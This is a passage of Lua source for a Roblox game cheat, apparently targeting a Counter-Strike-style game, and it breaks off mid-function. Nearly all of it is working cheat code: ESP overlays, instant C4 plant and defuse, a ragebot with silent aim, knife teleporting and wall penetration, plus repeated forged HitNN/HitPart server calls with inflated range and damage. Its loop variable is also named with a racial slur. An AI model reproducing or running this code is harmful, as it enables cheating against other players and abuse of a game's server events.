		watermarklocation.watermark.title.Text = textierawr
	end)
end)

watermark:Element('Dropdown', 'text font', {options = fonts}, function(tbl)
	watermarklocation.watermark.title.Font = Enum.Font[tbl.Dropdown]
end)

watermark:Element('Slider', 'text size', {min = 0, max = 50, default = watermarklocation.watermark.title.TextSize}, function(tbl)
	watermarklocation.watermark.title.TextSize = tbl.Slider
end)

watermark:Element('Slider', 'text line height', {min = -50, max = 50, default = watermarklocation.watermark.title.LineHeight}, function(tbl)
	watermarklocation.watermark.title.LineHeight = 1.1 * (tbl.Slider / 10)
end)

watermark:Element('Slider', 'watermark lenght', {min = 0, max = 100, default = 89}, function(tbl)
	watermarklocation.watermark.Size = C.UDIM2(0, tbl.Slider * 5, 0, values.misc.watermark['watermark height'].Slider)
end)
watermark:Element('Slider', 'watermark height', {min = 0, max = 100, default = 20}, function(tbl)
	watermarklocation.watermark.Size = C.UDIM2(0, values.misc.watermark['watermark lenght'].Slider * 5, 0, tbl.Slider)
end)

watermark:Element('ToggleColor', 'border color', {default = {Color = C.COL3RGB(255,255,255)}}, function(tbl)
	watermarklocation.watermark.BorderColor3 = tbl.Color
end)

watermark:Element('ToggleColor', 'text color', {default = {Color = C.COL3RGB(255,255,255)}}, function(tbl)
	watermarklocation.watermark.title.TextColor3 = tbl.Color
end)
local objects = {}
local utility = {} 

do
	utility.default = {
		Line = {
			Thickness = 1.5,
			Color = C.COL3RGB(255, 255, 255),
			Visible = false
		},
		Text = {
			Size = 13,
			Center = true,
			Outline = true,
			Font = Drawing.Fonts.Plex,
			Color = C.COL3RGB(255, 255, 255),
			Visible = false
		},
		Square = {
			Thickness = 1.5,
			Filled = false,
			Color = C.COL3RGB(255, 255, 255),
			Visible = false
		},
	}
	function utility.create(type, isOutline)
		local drawing = Drawing.new(type)
		for i, v in pairs(utility.default[type]) do
			drawing[i] = v
		end
		if isOutline then
			drawing.Color = C.COL3(0,0,0)
			drawing.Thickness = 3
		end
		return drawing
	end
	function utility.add(plr)
		if not objects[plr] then
			objects[plr] = {
				Name = utility.create('Text'),
				Weapon = utility.create('Text'),
				Armor = utility.create('Text'),
				--Crouching = utility.create('Text'),
				BoxOutline = utility.create('Square', true),
				Box = utility.create('Square'),
				HealthOutline = utility.create('Line', true),
				Health = utility.create('Line'),
			}
		end
	end
	for _,plr in pairs(Players:GetPlayers()) do
		if Player ~= LocalPlayer then
			utility.add(plr)
		end
	end
	Players.PlayerAdded:Connect(utility.add)
	Players.PlayerRemoving:Connect(function(plr)
		wait()
		if objects[plr] then
			for i,v in pairs(objects[plr]) do
				for i2,v2 in pairs(v) do
					if v then
						v:Remove()
					end
				end
			end

			objects[plr] = nil
		end
	end)
end
local Items = C.INST("ScreenGui") 
Items.Name = "Items" 
Items.Parent = game.CoreGui 
Items.ResetOnSpawn = false 
Items.ZIndexBehavior = "Global" 
do 
	function add(plr) 
		local ImageLabel = C.INST("ImageLabel") 
		ImageLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
		ImageLabel.BackgroundTransparency = 1.000 
		ImageLabel.Size = C.UDIM2(0, 62, 0, 25) 
		ImageLabel.Visible = false 
		ImageLabel.Image = "rbxassetid://1784884358" 
		ImageLabel.ScaleType = Enum.ScaleType.Fit 
		ImageLabel.Name = plr.Name 
		ImageLabel.AnchorPoint = C.Vec2(0.5,0.5) 
		ImageLabel.Parent = Items 
	end 
	for _,plr in pairs(Players:GetPlayers()) do 
		if Player ~= LocalPlayer then 
			add(plr) 
		end 
	end 
	Players.PlayerAdded:Connect(add) 
	Players.PlayerRemoving:Connect(function(plr) 
		wait() 
		Items[plr.Name]:Destroy() 
	end) 
end 
--[[local debrisitems = {} 
workspace.Debris.ChildAdded:Connect(function(obj) 
	if obj:IsA("BasePart") and Weapons:FindFirstChild(obj.Name) then 
		RunService.RenderStepped:Wait() 

		local BillboardGui = C.INST("BillboardGui") 
		BillboardGui.AlwaysOnTop = true 
		BillboardGui.Size = C.UDIM2(0, 40, 0, 40) 
		BillboardGui.Adornee = obj 

		local ImageLabel = C.INST("ImageLabel") 
		ImageLabel.Parent = BillboardGui 
		ImageLabel.BackgroundTransparency = 1 
		ImageLabel.Size = C.UDIM2(1, 0, 1, 0) 
		ImageLabel.ImageColor3 = values.visuals.world["item esp"].Color 
		ImageLabel.Image = GetIcon.getWeaponOfKiller(obj.Name) 
		ImageLabel.ScaleType = Enum.ScaleType.Fit 
		ImageLabel.Visible = values.visuals.world["item esp"].Toggle and C.TBLFIND(values.visuals.world["types"].Jumbobox, "icon") and true or false 

		BillboardGui.Parent = obj 
	end 
end) --]]
--[[for _, obj in pairs(workspace.Debris:GetChildren()) do 
	if obj:IsA("BasePart") and Weapons:FindFirstChild(obj.Name) then 
		RunService.RenderStepped:Wait() 

		local BillboardGui = C.INST("BillboardGui") 
		BillboardGui.AlwaysOnTop = true 
		BillboardGui.Size = C.UDIM2(0, 40, 0, 40) 
		BillboardGui.Adornee = obj 

		local ImageLabel = C.INST("ImageLabel") 
		ImageLabel.Parent = BillboardGui 
		ImageLabel.BackgroundTransparency = 1 
		ImageLabel.Size = C.UDIM2(1, 0, 1, 0) 
		ImageLabel.ImageColor3 = values.visuals.world["item esp"].Color 
		ImageLabel.Image = GetIcon.getWeaponOfKiller(obj.Name) 
		ImageLabel.ScaleType = Enum.ScaleType.Fit 
		ImageLabel.Visible = values.visuals.world["item esp"].Toggle and C.TBLFIND(values.visuals.world["types"].Jumbobox, "icon") and true or false 

		BillboardGui.Parent = obj 
	end 
end --]]
local function YROTATION(cframe) 
	local x, y, z = cframe:ToOrientation() 
	return C.CF(cframe.Position) * C.CFAngles(0,y,0) 
end
--[[local weps = { 
	Pistol = {"USP", "P2000", "Glock", "DualBerettas", "P250", "FiveSeven", "Tec9", "CZ", "DesertEagle", "R8"}, 
	SMG = {"MP9", "MAC10", "MP7", "UMP", "P90", "Bizon"}, 
	Rifle = {"M4A4", "M4A1", "AK47", "Famas", "Galil", "AUG", "SG"}, 
	Sniper = {"AWP", "Scout", "G3SG1"} 
}--]]





UserInputService.InputBegan:Connect(function(key, isFocused)
	if key.UserInputType == Enum.UserInputType.MouseButton1 and UserInputService:GetFocusedTextBox() == nil then
		if values.rage.exploits["Plant c4 type"].Dropdown == "Instant" and IsAlive(LocalPlayer) and LocalPlayer.Character.EquippedTool.Value == "C4" then
			game.ReplicatedStorage.Events.PlantC4:FireServer((LocalPlayer.Character.HumanoidRootPart.CFrame + C.Vec3(0, -2.75, 0)) * C.CFAngles(C.RAD(90), 0, C.RAD(180)), GetSite())
		elseif values.rage.exploits["Plant c4 type"].Dropdown == "Anywhere" and IsAlive(LocalPlayer) and LocalPlayer.Character.EquippedTool.Value == "C4" then
			PlantC4()
		end
	elseif key.KeyCode == Enum.KeyCode.E then
		if values.rage.exploits["Defuse c4 type"].Dropdown == "Instant" and workspace:FindFirstChild("C4") then
			spawn(function()
				wait(0.25)
				if IsAlive(LocalPlayer) and workspace:FindFirstChild("C4") and workspace.C4:FindFirstChild("Defusing") and LocalPlayer.PlayerGui.GUI.Defusal.Visible == true and workspace.C4.Defusing.Value == LocalPlayer then
					LocalPlayer.Backpack.Defuse:FireServer(workspace.C4)
				end
			end)
		elseif values.rage.exploits["Defuse c4 type"].Dropdown == "Anywhere" and IsAlive(LocalPlayer) then
			DefuseC4()
		end
	end
end)

switchtrigger = {false, nil, nil}
savedspinpitch = 0
Jitter = false
jitterwait = false
lockyaw = false

local Spin = 0 
local Hitboxes = {}
allowedtofreeze = true
local RageTarget 
local Filter = false 
local LastStep 
local TriggerDebounce = false 
local DisableAA = false 
aroundtheworld_value = 0

local Fov = Drawing.new("Circle") 
Fov.Filled = true 
Fov.Color = C.COL3RGB(15,15,15) 
Fov.Transparency = 0.5 
Fov.Position = C.Vec2(Mouse.X, Mouse.Y + 16) 
Fov.Radius = 120 
RunService:BindToRenderStep('Rage', 400, function(step) --ragebot, rage bot (for searching)
	local Ping = game.Stats.PerformanceStats.Ping:GetValue()
	LastStep = step
	local CamCFrame = Camera.CFrame
	local CamLook = CamCFrame.LookVector
	local PlayerIsAlive = false
	--local Character = LocalPlayer.Character
	RageTarget = nil

	
	if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") and LocalPlayer.Character:FindFirstChild("Humanoid").Health > 0 and LocalPlayer.Character:FindFirstChild("UpperTorso") then
		PlayerIsAlive = true
	end
	
	--wait(5)
	if PlayerIsAlive then
	local Root = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
		local RageGuy 
		if workspace:FindFirstChild("Map") and Client.gun ~= "none" and Client.gun.Name ~= "C4" then
			if values.rage.aimbot.enabled.Toggle and LocalPlayer.Character and LocalPlayer.Character.HumanoidRootPart and Client.gun then
				local Origin = values.rage.aimbot.origin.Dropdown == "character" and LocalPlayer.Character.LowerTorso.Position + C.Vec3(0, 2.5, 0) or CamCFrame.p
				local Stats = values.rage.weapons.default
				for _,Player in pairs(Players:GetPlayers()) do
					if C.TBLFIND(values.misc.client["gun modifiers"].Jumbobox, "firerate") then
						Client.DISABLED = false
					end
					 
					if Player.Character and Player.Character:FindFirstChild("Humanoid") and Player.Character:FindFirstChild("Humanoid").Health > 0 and Player.Team ~= "TTT" and Player ~= LocalPlayer  and (Player.TeamColor ~= LocalPlayer.TeamColor or values.rage.aimbot.teammates.Toggle) then
						if C.TBLFIND(values.rage.aimbot.resolver.Jumbobox, 'pitch') then
							if Player.Character.UpperTorso:FindFirstChild('Waist') then
							Player.Character.UpperTorso.Waist.C0 = C.CF(0, 0.5, 0)
							end
                            Player.Character.Head.Neck.C0 = C.CF(0, 0.7, 0)
						end
						if C.TBLFIND(values.rage.aimbot.resolver.Jumbobox, 'roll') then
							Player.Character.Humanoid.MaxSlopeAngle = 0
						end
						if C.TBLFIND(values.rage.aimbot.resolver.Jumbobox, 'arms') then
							Player.Character.RightUpperArm:FindFirstChildWhichIsA('Motor6D').C0 = C.CF(1.5, 0.549999952, -0.2)
							Player.Character.LeftUpperArm:FindFirstChildWhichIsA('Motor6D').C0 = CFrame.new(-1.5, 0.549999952, -0.2)
						end
						if C.TBLFIND(values.rage.aimbot.resolver.Jumbobox, 'animation') then
							for a, b in next, Player.Character.Humanoid:GetPlayingAnimationTracks() do
								b:Stop()
							end
						end
						if C.TBLFIND(values.rage.aimbot.resolver.Jumbobox, "bhop") then   
							Player.Character.Head.CFrame = C.CF(Player.Character.Head.Position)
							Player.Character.UpperTorso.CFrame = C.CF(Player.Character.UpperTorso.Position)
							Player.Character.LowerTorso.CFrame = C.CF(Player.Character.LowerTorso.Position)
							Player.Character.LeftLowerArm.CFrame = C.CF(Player.Character.LeftLowerArm.Position)
							Player.Character.LeftUpperArm.CFrame = C.CF(Player.Character.LeftUpperArm.Position)
							Player.Character.RightLowerArm.CFrame = C.CF(Player.Character.RightLowerArm.Position)
							Player.Character.RightUpperArm.CFrame = C.CF(Player.Character.RightUpperArm.Position)
							Player.Character.LeftLowerLeg.CFrame = C.CF(Player.Character.LeftLowerLeg.Position)
							Player.Character.LeftUpperLeg.CFrame = C.CF(Player.Character.LeftUpperLeg.Position)
							Player.Character.RightLowerLeg.CFrame = C.CF(Player.Character.RightLowerLeg.Position)
							Player.Character.RightUpperLeg.CFrame = C.CF(Player.Character.RightUpperLeg.Position)
						end
					end
					if Player.Character and (Player.TeamColor ~= LocalPlayer.TeamColor or values.rage.aimbot.teammates.Toggle) and Player.Character:FindFirstChild("Humanoid") and not Client.DISABLED and Player.Character:FindFirstChild("Humanoid").Health > 0 and Player.Team ~= "TTT" and not Player.Character:FindFirstChildOfClass("ForceField") and GetDeg(CamCFrame, Player.Character.Head.Position) <= values.rage.weapons.default["max fov"].Slider and Player ~= LocalPlayer then
						if Player.Team ~= LocalPlayer.Team or values.rage.aimbot.teammates.Toggle and Player:FindFirstChild("Status") and Player.Status.Team.Value ~= LocalPlayer.Status.Team.Value and Player.Status.Alive.Value then
							if Client.gun:FindFirstChild("Melee") and values.rage.aimbot["knifebot"].Toggle then -- knife bot (for fast searching)
							local AutoPeek = {OldPeekPosition = CFrame.new()}
							AutoPeek.OldPeekPosition = LocalPlayer.Character.HumanoidRootPart.CFrame
							if values.rage.exploits["otw knife"].Toggle and values.rage.exploits["otw knife"].Active then 
								for i,v in next, Players:GetChildren() do
									if v ~= LocalPlayer and v.Team ~= LocalPlayer.Team then
												if v.Character and v.Character:FindFirstChild("HumanoidRootPart") then
												aroundtheworld_value=aroundtheworld_value + (0.01 * 2)
												LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame*C.CFAngles(0, aroundtheworld_value, 0)*C.CF(0, 0, 500)
												break
											end
										end
									end
							else
								LocalPlayer.Character.HumanoidRootPart.CFrame = AutoPeek.OldPeekPosition
							end
					for i,v in pairs(workspace.Ray_Ignore:GetDescendants()) do
						v:Destroy()
					end
								local Ignore = {unpack(Collision)}
								if #ragebotwhitelist ~= 0 then
									for i,v in pairs(ragebotwhitelist) do
										C.INSERT(Ignore, v)
									end
								end
								if values.rage.aimbot["knifebot type"].Dropdown == "rapid" then
									Client.DISABLED = false
								end
								if not values.rage.aimbot["knife wallcheck"].Toggle then
									C.INSERT(Ignore, game.Workspace.Map)
								end
								C.INSERT(Ignore, game.Workspace.Map.Clips)
								C.INSERT(Ignore, game.Workspace.Map.SpawnPoints)
								C.INSERT(Ignore, LocalPlayer.Character)
								C.INSERT(Ignore, Player.Character.HumanoidRootPart)
								if Player.Character:FindFirstChild("BackC4") then
									C.INSERT(Ignore, Player.Character.BackC4)
								end
								if Player.Character:FindFirstChild("Gun") then
									C.INSERT(Ignore, Player.Character.Gun)
								end

								local Ray = C.RAY(Origin, (Player.Character.Head.Position - Origin).unit * values.rage.aimbot["Knifebot Radius"].Slider)
								local Hit, Pos = workspace:FindPartOnRayWithIgnoreList(Ray, Ignore, false, true)

								if Hit and Hit.Parent == Player.Character then
									RageGuy = Hit
									RageTarget = Hit
									if not values.rage.aimbot["silent aim"].Toggle then
										Camera.CFrame = C.CF(CamCFrame.Position, Hit.Position)
									end
									Filter = true
									Client.DISABLED = false
									Filter = false
--arguments
										--[1] = Hit,
										--[2] = Hit.Position,
                ReplicatedStorage.Events.HitNN:FireServer(
                    Hit, -- 1
                    Hit.CFrame.p, --2
                    "Banana", --3
                    100000000000000, -- Range --4
                    game.Players.LocalPlayer.Character:WaitForChild("Gun"), --5
                    C.Vec3(), -- Start Position --6
                    C.Vec3(), -- end position
                    100000, -- Damage Modifier
                    false,
                    true,
                    C.Vec3(),
                    100,
                    C.Vec3()
                )
								end
							else
								local Ignore = {unpack(Collision)}
								if #ragebotwhitelist ~= 0 then
									for i,v in pairs(ragebotwhitelist) do
										C.INSERT(v, Ignore)
									end
								end
								C.INSERT(Ignore, workspace.Map.Clips)
								C.INSERT(Ignore, workspace.Map.SpawnPoints)
								C.INSERT(Ignore, LocalPlayer.Character)
								C.INSERT(Ignore, Player.Character.HumanoidRootPart)
								if Player.Character:FindFirstChild("BackC4") then
									C.INSERT(Ignore, Player.Character.BackC4)
								end
								if Player.Character:FindFirstChild("Gun") then
									C.INSERT(Ignore, Player.Character.Gun)
								end
								table.clear(Hitboxes)
								for _,Hitbox in ipairs(values.rage.weapons.default.hitboxes.Jumbobox) do
									if (Player.TeamColor ~= LocalPlayer.TeamColor or values.rage.aimbot.teammates.Toggle) and Player.Character then
--values.rage.aimbot["auto baim"].Toggle
										if values.rage.aimbot["auto baim"].Toggle then
											if Player.Character:FindFirstChild('FakeHead') or Player.Character:FindFirstChild('HeadHB') and Hitbox == 'Head' then
												C.INSERT(Hitboxes, Player.Character.Head)
												if values.misc.Backtrack.enabled.Toggle then 
													C.INSERT(Hitboxes, workspace.backtrackfolder[Player.Name].Head)
												end
											else
												C.INSERT(Hitboxes, Player.Character.UpperTorso)
												C.INSERT(Hitboxes, Player.Character.LowerTorso)
												if values.misc.Backtrack.enabled.Toggle then 
													C.INSERT(Hitboxes, workspace.backtrackfolder[Player.Name].UpperTorso)
													C.INSERT(Hitboxes, workspace.backtrackfolder[Player.Name].LowerTorso)
												end
											end
										else
											if Hitbox == 'Head' then
												C.INSERT(Hitboxes, Player.Character.Head)
												if values.misc.Backtrack.enabled.Toggle then 
													C.INSERT(Hitboxes, workspace.backtrackfolder[Player.Name].Head)
												end												
											elseif Hitbox == "torso" then
												C.INSERT(Hitboxes, Player.Character.UpperTorso)
												C.INSERT(Hitboxes, Player.Character.LowerTorso)
												if values.misc.Backtrack.enabled.Toggle then 
													C.INSERT(Hitboxes, workspace.backtrackfolder[Player.Name].UpperTorso)
													C.INSERT(Hitboxes, workspace.backtrackfolder[Player.Name].LowerTorso)
												end												
											elseif Hitbox == "arms" then
												C.INSERT(Hitboxes, Player.Character.LeftLowerArm)
												C.INSERT(Hitboxes, Player.Character.LeftUpperArm)
												C.INSERT(Hitboxes, Player.Character.LeftArm)
												C.INSERT(Hitboxes, Player.Character.RightLowerArm)
												C.INSERT(Hitboxes, Player.Character.RightUpperArm)
												C.INSERT(Hitboxes, Player.Character.RightHand)
												if values.misc.Backtrack.enabled.Toggle then 
													C.INSERT(Hitboxes, workspace.backtrackfolder[Player.Name].LeftLowerArm)
													C.INSERT(Hitboxes, workspace.backtrackfolder[Player.Name].LeftUpperArm)
													C.INSERT(Hitboxes, workspace.backtrackfolder[Player.Name].LeftArm)
													C.INSERT(Hitboxes, workspace.backtrackfolder[Player.Name].RightLowerArm)
													C.INSERT(Hitboxes, workspace.backtrackfolder[Player.Name].RightUpperArm)
													C.INSERT(Hitboxes, workspace.backtrackfolder[Player.Name].RightHand)
												end													
											elseif Hitbox == "legs" then
												C.INSERT(Hitboxes, Player.Character.LeftLowerLeg)
												C.INSERT(Hitboxes, Player.Character.LeftUpperLeg)
												C.INSERT(Hitboxes, Player.Character.LeftFoot)
												C.INSERT(Hitboxes, Player.Character.RightLowerLeg)
												C.INSERT(Hitboxes, Player.Character.RightUpperLeg)
												C.INSERT(Hitboxes, Player.Character.RightFoot)
												if values.misc.Backtrack.enabled.Toggle then 
													C.INSERT(Hitboxes, workspace.backtrackfolder[Player.Name].LeftLowerLeg)
													C.INSERT(Hitboxes, workspace.backtrackfolder[Player.Name].LeftUpperLeg)
													C.INSERT(Hitboxes, workspace.backtrackfolder[Player.Name].LeftFoot)
													C.INSERT(Hitboxes, workspace.backtrackfolder[Player.Name].RightLowerLeg)
													C.INSERT(Hitboxes, workspace.backtrackfolder[Player.Name].RightUpperLeg)
													C.INSERT(Hitboxes, workspace.backtrackfolder[Player.Name].RightFoot)
												end	
											end
										end
									end
								end
								for _,Hitbox in ipairs(Hitboxes) do 
									local Ignore2 = {unpack(Ignore)} 
									for _,Part in pairs(Player.Character:GetChildren()) do 
										if Part ~= Hitbox then C.INSERT(Ignore2, Part) end 
									end 
									if values.rage.aimbot["automatic penetration"].Toggle then 
									    local Hits = {}
										local EndHit, Hit, Pos
										local Penetration = Client.gun.Penetration.Value * values.rage.aimbot["automatic penetration modifier"].Slider/100
										local Ray1 = C.RAY(Origin, (Hitbox.Position - Origin).unit * (Hitbox.Position - Origin).magnitude)
										repeat
											Hit, Pos = workspace:FindPartOnRayWithIgnoreList(Ray1, Ignore2, false, true)
											if Hit ~= nil and Hit.Parent ~= nil then
												if Hit and Multipliers[Hit.Name] ~= nil then
													EndHit = Hit
												else
													C.INSERT(Ignore2, Hit)
													C.INSERT(Hits, {["Position"] = Pos,["Hit"] = Hit})
												end
											end
										until EndHit ~= nil or #Hits >= 4 or Hit == nil
										if EndHit ~= nil and Multipliers[EndHit.Name] ~= nil and #Hits <= 4 then
											if #Hits == 0 then
												local Damage = Client.gun.DMG.Value * Multipliers[EndHit.Name]
												if Player:FindFirstChild("Kevlar") then
													if C.FIND(EndHit.Name, "Head") then
														if Player:FindFirstChild("Helmet") then
															Damage = (Damage / 100) * Client.gun.ArmorPenetration.Value
														end
													else
														Damage = (Damage / 100) * Client.gun.ArmorPenetration.Value
													end
												end
												Damage = Damage * (Client.gun.RangeModifier.Value/100 ^ ((Origin - EndHit.Position).Magnitude/500))/100
												if Damage >= values.rage.weapons.default["minimum damage"].Slider then
													RageGuy = EndHit
													RageTarget = EndHit
													if not values.rage.aimbot["silent aim"].Toggle then
														Camera.CFrame = C.CF(CamCFrame.Position, EndHit.Position)
													end
													Filter = true
													if values.rage.aimbot["automatic fire"].Dropdown == "standard" then
														Client.firebullet()
														VisualizeSilentAngles(RageTarget.Position)
													--[[if values.misc.client.hitlogs.Toggle then -- 
														CreateHitElement(" Hit "..EndHit.Parent.Name.." in the "..EndHit.Name.."  ",values.misc.client.hitlogs.Color,1 * values.misc.client["log time"].Slider, 0, 280, 0, 22)
													end--]]
													if values.rage.exploits['custom tap'].Toggle and values.rage.exploits['custom tap'].Active then
														for chingchong = 2, values.rage.exploits['tap amount'].Slider do
															Client.firebullet()
														end
													end
													elseif values.rage.aimbot["automatic fire"].Dropdown == "hitpart" then
														Client.firebullet()
														local Arguments = {
															[1] = EndHit,
															[2] = EndHit.Position,
															[3] = LocalPlayer.Character.EquippedTool.Value,
															[4] = 100,
															[5] = LocalPlayer.Character.Gun, 
															[8] = values.rage.exploits["damage modifier"].Slider,
															[9] = false,
															[10] = false,
															[11] = C.Vec3(),
															[12] = 100,
															[13] = C.Vec3()
														}
														game.ReplicatedStorage.Events.HitNN:FireServer(unpack(Arguments))
														VisualizeSilentAngles(RageTarget.Position)
														if values.rage.exploits['custom tap'].Toggle and values.rage.exploits['custom tap'].Active then
														for chingchong = 2, values.rage.exploits['tap amount'].Slider do
															Client.firebullet()
															local Arguments = {
																[1] = EndHit,
																[2] = EndHit.Position,
																[3] = LocalPlayer.Character.EquippedTool.Value,
																[4] = 100,
																[5] = LocalPlayer.Character.Gun,
																[8] = values.rage.exploits["damage modifier"].Slider,
																[9] = false,
																[10] = false,
																[11] = C.Vec3(),
																[12] = 100,
																[13] = C.Vec3()
															}
															game.ReplicatedStorage.Events.HitNN:FireServer(unpack(Arguments))
														end
													end
													--[[if values.misc.client.hitlogs.Toggle then
														CreateHitElement(" Hit "..EndHit.Parent.Name.." in the "..EndHit.Name,values.misc.client.hitlogs.Color,1 * values.misc.client["log time"].Slider, 0, 280, 0, 22)
													end--]]
													end
													Filter = false
													break
												end
											else
												local penetration = Client.gun.Penetration.Value * values.rage.aimbot["automatic penetration modifier"].Slider/100
												local limit = 0
												local dmgmodifier = 1
												for i = 1, #Hits do
													local data = Hits[i]
													local part = data["Hit"]
													local pos = data["Position"]
													local modifier = 1
													if part.Material == Enum.Material.DiamondPlate then
														modifier = 3
													end
													if part.Material == Enum.Material.CorrodedMetal or part.Material == Enum.Material.Metal or part.Material == Enum.Material.Concrete or part.Material == Enum.Material.Brick then
														modifier = 2
													end
													if part.Name == "Grate" or part.Material == Enum.Material.Wood or part.Material == Enum.Material.WoodPlanks then
														modifier = 0.1
													end
													if part.Name == "nowallbang" then
														modifier = 100
													end
													if part:FindFirstChild("PartModifier") then
														modifier = part.PartModifier.Value
													end
													if part.Transparency == 1 or part.CanCollide == false or part.Name == "Glass" or part.Name == "Cardboard" then
														modifier = 0
													end
													local direction = (Hitbox.Position - pos).unit * C.CLAMP(Client.gun.Range.Value, 1, 100)
													local ray = C.RAY(pos + direction * 1, direction * -2)
													local _,endpos = workspace:FindPartOnRayWithWhitelist(ray, {part}, true)
													local thickness = (endpos - pos).Magnitude
													thickness = thickness * modifier
													limit = C.MIN(penetration, limit + thickness)
													dmgmodifier = 1 - limit / penetration
												end
												local Damage = Client.gun.DMG.Value * Multipliers[EndHit.Name] * dmgmodifier
												if Player:FindFirstChild("Kevlar") then
													if C.FIND(EndHit.Name, "Head") then
														if Player:FindFirstChild("Helmet") then
															Damage = (Damage / 100) * Client.gun.ArmorPenetration.Value
														end
													else
														Damage = (Damage / 100) * Client.gun.ArmorPenetration.Value
													end
												end
												Damage = Damage * (Client.gun.RangeModifier.Value/100 ^ ((Origin - EndHit.Position).Magnitude/500))/100
												if Damage >= values.rage.weapons.default["minimum damage"].Slider then
													RageGuy = EndHit
													RageTarget = EndHit
													if not values.rage.aimbot["silent aim"].Toggle then
														Camera.CFrame = C.CF(CamCFrame.Position, EndHit.Position)
													end
													Filter = true
													if values.rage.aimbot["automatic fire"].Dropdown == "standard" then
														Client.firebullet()
														VisualizeSilentAngles(RageTarget.Position)
													--[[-if values.misc.client.hitlogs.Toggle then -- 
														CreateHitElement(" Hit "..EndHit.Parent.Name.." in the "..EndHit.Name.."  ",values.misc.client.hitlogs.Color,1 * values.misc.client["log time"].Slider, 0, 280, 0, 22)
													end--]]
													if values.rage.exploits['custom tap'].Toggle and values.rage.exploits['custom tap'].Active then
														for chingchong = 2, values.rage.exploits['tap amount'].Slider do
															Client.firebullet()
														end
													end
												
													elseif values.rage.aimbot["automatic fire"].Dropdown == "hitpart" then
														Client.firebullet()
															if game.ReplicatedStorage.Events:FindFirstChild('HitNN') then
															game.ReplicatedStorage.Events.HitNN:FireServer(
																EndHit,
																EndHit.Position,
																LocalPlayer.Character.EquippedTool.Value,
																100,
																LocalPlayer.Character.Gun,
																values.rage.exploits["damage modifier"].Slider,
																false,
																false,
																C.Vec3(),
																100,
																C.Vec3()
															)
															else
															game.ReplicatedStorage.Events.HitPart:FireServer(
																EndHit,
																EndHit.Position,
																LocalPlayer.Character.EquippedTool.Value,
																100,
																LocalPlayer.Character.Gun,
																values.rage.exploits["damage modifier"].Slider,
																false,
																false,
																C.Vec3(),
																100,
																C.Vec3()
															)															
															end
														VisualizeSilentAngles(RageTarget.Position)
														if values.rage.exploits['custom tap'].Toggle and values.rage.exploits['custom tap'].Active then
														for chingchong = 2, values.rage.exploits['tap amount'].Slider do
															Client.firebullet()
															if game.ReplicatedStorage.Events:FindFirstChild('HitNN') then
															game.ReplicatedStorage.Events.HitNN:FireServer(
																EndHit,
																EndHit.Position,
																LocalPlayer.Character.EquippedTool.Value,
																100,
																LocalPlayer.Character.Gun,
																values.rage.exploits["damage modifier"].Slider,
																false,
																false,
																C.Vec3(),
																100,
																C.Vec3()
															)
															else
															game.ReplicatedStorage.Events.HitPart:FireServer(
																EndHit,
																EndHit.Position,
																LocalPlayer.Character.EquippedTool.Value,
																100,
																LocalPlayer.Character.Gun,
																values.rage.exploits["damage modifier"].Slider,
																false,
																false,
																C.Vec3(),
																100,
																C.Vec3()
															)															
															end
															
														end
													end
													--[[if values.misc.client.hitlogs.Toggle then -- 
														CreateHitElement(" Hit "..EndHit.Parent.Name.." in the "..EndHit.Name.."  ",values.misc.client.hitlogs.Color,1 * values.misc.client["log time"].Slider, 0, 280, 0, 22)
													end--]]
													end
													Filter = false
													break
												end
											end
										end
									else
										local Ray = C.RAY(Origin, (Hitbox.Position - Origin).unit * (Hitbox.Position - Origin).magnitude)
										local Hit, Pos = workspace:FindPartOnRayWithIgnoreList(Ray, Ignore2, false, true)
										if Hit and Multipliers[Hit.Name] ~= nil then
										EndHit = Hit
											local Damage = Client.gun.DMG.Value * Multipliers[Hit.Name]
											if Player:FindFirstChild("Kevlar") then
												if C.FIND(Hit.Name, "Head") then											
													if Player:FindFirstChild("Helmet") then
														Damage = (Damage / 100) * Client.gun.ArmorPenetration.Value
													end
												else
													Damage = (Damage / 100) * Client.gun.ArmorPenetration.Value
												end
											end
											Damage = Damage * (Client.gun.RangeModifier.Value/100 ^ ((Origin - Hit.Position).Magnitude/500))
											if Damage >= values.rage.weapons.default["minimum damage"].Slider then
												RageGuy = Hit
												RageTarget = Hit
												if not values.rage.aimbot["silent aim"].Toggle then
													Camera.CFrame = C.CF(CamCFrame.Position, Hit.Position)
												end
												Filter = true
												if values.rage.aimbot["automatic fire"].Dropdown == "standard" then
													Client.firebullet()
													VisualizeSilentAngles(RageTarget.Position)
													--[[if values.misc.client.hitlogs.Toggle then -- 
														CreateHitElement(" Hit "..Hit.Parent.Name.." in the "..Hit.Name.."  ",values.misc.client.hitlogs.Color,1 * values.misc.client["log time"].Slider, 0, 280, 0, 22)
													end--]]
                                                    if values.rage.exploits['custom tap'].Toggle and values.rage.exploits['custom tap'].Active then
                                                        for chingchong = 2, values.rage.exploits['tap amount'].Slider do
                                                            Client.firebullet()
                                                        end
                                                    end
												elseif values.rage.aimbot["automatic fire"].Dropdown == "hitpart" then
													Client.firebullet()
															if game.ReplicatedStorage.Events:FindFirstChild('HitNN') then
															game.ReplicatedStorage.Events.HitNN:FireServer(
																EndHit,
																EndHit.Position,
																LocalPlayer.Character.EquippedTool.Value,
																100,
																LocalPlayer.Character.Gun,
																values.rage.exploits["damage modifier"].Slider,
																false,
																false,
																C.Vec3(),
																100,
																C.Vec3()
															)
															else
															game.ReplicatedStorage.Events.HitPart:FireServer(
																EndHit,
																EndHit.Position,
																LocalPlayer.Character.EquippedTool.Value,
																100,
																LocalPlayer.Character.Gun,
																values.rage.exploits["damage modifier"].Slider,
																false,
																false,
																C.Vec3(),
																100,
																C.Vec3()
															)															
															end
													VisualizeSilentAngles(RageTarget.Position)
													if values.rage.exploits['custom tap'].Toggle and values.rage.exploits['custom tap'].Active then
														for chingchong = 2, values.rage.exploits['tap amount'].Slider do
															Client.firebullet()
															if game.ReplicatedStorage.Events:FindFirstChild('HitNN') then
															game.ReplicatedStorage.Events.HitNN:FireServer(
																EndHit,
																EndHit.Position,
																LocalPlayer.Character.EquippedTool.Value,
																100,
																LocalPlayer.Character.Gun,
																values.rage.exploits["damage modifier"].Slider,
																false,
																false,
																C.Vec3(),
																100,
																C.Vec3()
															)
															else
															game.ReplicatedStorage.Events.HitPart:FireServer(
																EndHit,
																EndHit.Position,
																LocalPlayer.Character.EquippedTool.Value,
																100,
																LocalPlayer.Character.Gun,
																values.rage.exploits["damage modifier"].Slider,
